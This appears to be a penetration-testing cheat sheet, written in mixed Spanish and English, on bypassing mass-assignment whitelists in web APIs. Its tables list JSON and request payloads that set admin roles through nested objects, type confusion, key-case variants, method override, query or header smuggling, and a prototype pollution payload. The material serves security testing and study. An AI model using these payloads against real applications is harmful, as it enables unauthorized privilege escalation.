---
aliases:
  - Mass Assignment Bypass
  - Nested Object Injection
  - Snake Camel Bypass
tags:
  - type/cheatsheet
  - vuln/mass-assignment
  - technique/defense-evasion
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - '[[Mass Assignment]]'
---
# Mass Assignment - Bypass de Whitelists

***

## Nested Object Injection

| **Bypass** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Concept | Backend permits nested attrs (e.g. address). Atacante injects sensitive nested attribute. | Common Rails `accept_nested_attributes_for`. |
| Single nested | `{"user": {"name":"x", "role":{"name":"admin"}}}` | If `role` accepted as nested. |
| Nested attributes Rails | `{"user": {"name":"x", "addresses_attributes":[{"role":"admin"}]}}` | Nested attrs API. |
| Polymorphic nested | `{"item": {"type":"User", "id":1, "is_admin":true}}` | If `_type` attr leveraged. |
| Profile/User nested | `{"profile":{"user":{"is_admin":true}}}` | Multi-level. |
| Override via association | `{"user_id": 1}` to change owner of entity | Indirect. |
| Through HasMany | Nested writes to associated models | Privesc via associations. |
| GraphQL nested input | `{input:{user:{role:"admin"}}}` | Same. |
| MongoDB sub-document | Nested update operators | NoSQL specific. |
| Combine con prototype pollution | `{"__proto__":{"isAdmin":true}}` | If lodash merge. |
^ma-bypass-nested

___

## Array vs Object Polyglot

| **Bypass** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Concept | Backend espera object, atacante manda array (or vice versa) → bypass tipo check | Type confusion. |
| Array como `roles` | `{"roles": ["admin", "user"]}` instead of `{"role": "admin"}` | Multi-role injection. |
| Object como string | `{"role": {"name": "admin"}}` instead of `{"role": "admin"}` | Object overrides string. |
| Mixed nested | `{"user": [{"role": "admin"}]}` | Array of users. |
| Single value `vs` array | `{"id": 1}` vs `{"id": [1, 2, 3]}` | Backend may pick first. |
| Empty array | `{"roles": []}` | Reset roles to empty. |
| Boolean as string | `{"isAdmin": "true"}` | Type coercion. |
| Number as string | `{"role_id": "1"}` | Same. |
| Object as boolean | `{"is_admin": {}}` | Truthy in JS. |
| Null as deletion | `{"is_admin": null}` | Some ORMs interpret as delete field. |
| Stringified JSON | `{"data": "{\"isAdmin\":true}"}` | If parsed twice. |
| Empty string | `{"role": ""}` | Reset to default. |
^ma-bypass-types

___

## Case Manipulation

| **Bypass** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Concept | Whitelist case-sensitive, backend case-insensitive (or vice versa) → bypass. | Common naming convention bug. |
| snake_case to camelCase | `is_admin` → `isAdmin` | If filter only blocks one. |
| camelCase to snake_case | `isAdmin` → `is_admin` | Same. |
| PascalCase | `IsAdmin` | Some langs (.NET). |
| kebab-case | `is-admin` | Less common but possible. |
| Uppercase | `IS_ADMIN` | Constant style. |
| Mixed | `iS_AdMin` | Random case. |
| Trailing whitespace | `is_admin ` | Strip varies. |
| Leading whitespace | ` is_admin` | Same. |
| With underscore prefix | `_isAdmin` | Some libs strip leading underscore. |
| With dollar sign | `$isAdmin` | jQuery-style. |
| With dot notation | `user.isAdmin` | If parsed as path. |
| Unicode lookalikes | `іs_admin` (Cyrillic і) | Visual identical. |
| URL-encoded keys | `is%5Fadmin` (encoded `_`) | Bypass if decoded after filter. |
^ma-bypass-case

___

## HTTP Method Override

| **Bypass** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Concept | Different methods may use different validation. PATCH bypasses PUT validation. | Per-method config bug. |
| `PATCH` vs `PUT` | App enforces strict params en PUT but loose en PATCH | Different code paths. |
| `POST` con `_method=PUT` | Method override en body | Common Rails/Symfony. |
| `POST` con `X-HTTP-Method-Override` | Header override | Same idea. |
| `OPTIONS` | Exotic method may bypass auth | Edge. |
| `LINK`/`UNLINK` | Custom verbs | App-specific. |
| GraphQL mutation vs REST | Different validation | Per-API. |
| Bulk endpoint | `POST /users/bulk` may skip per-field validation | Edge. |
| Import endpoint | `POST /import` con full DTO array | Bypass UI flow. |
| Admin shadow endpoint | `POST /admin/users` con less validation | Privilege check missing. |
| API version | `/v1/users` vs `/v2/users` | Different code paths. |
^ma-bypass-method

___

## Query String vs Body

| **Bypass** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Concept | Some validators inspect body but not query params. Atacante injects via query. | Validator scope bug. |
| Field en query | `?is_admin=true` con body legitimate | If backend merges sources. |
| Field en path | `/users/1/is_admin/true` | Custom routing. |
| Field en cookie | `Cookie: is_admin=true` | If backend trusts cookie content. |
| Field en header | `X-Is-Admin: true` | If backend reads custom headers. |
| Multipart abuse | `Content-Type: multipart/form-data` con hidden fields | Bypass JSON validator. |
| Form-urlencoded with JSON | `is_admin=true` en form, mixed with JSON elsewhere | Content-type conflicts. |
| GraphQL via GET | `/graphql?query=mutation{updateUser(isAdmin:true)}` | GET method bypass. |
| Binary upload con metadata | Form upload con extra metadata fields | Edge. |
| WebSocket message | WS frame con extra fields | Real-time. |
| Header `Prefer:` | Some APIs read prefer header | OData-style. |
| RPC arguments | Backend RPC con N args bypasses single-validator | RPC vector. |
^ma-bypass-query

***
